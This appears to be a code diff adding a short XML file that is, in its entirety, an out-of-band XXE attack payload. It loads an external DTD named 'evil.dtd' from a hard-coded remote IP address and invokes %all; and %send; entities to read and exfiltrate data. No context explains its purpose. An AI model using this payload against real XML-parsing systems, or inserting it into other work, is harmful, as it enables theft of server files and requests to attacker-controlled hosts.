@@ -1,0 +1,7 @@
+<?xml version="1.0" encoding="UTF-8" ?>
+<!DOCTYPE try [
+<!ENTITY % int SYSTEM "http://118.89.61.71:8000/evil.dtd">
+%int;
+%all;
+%send;
+]>
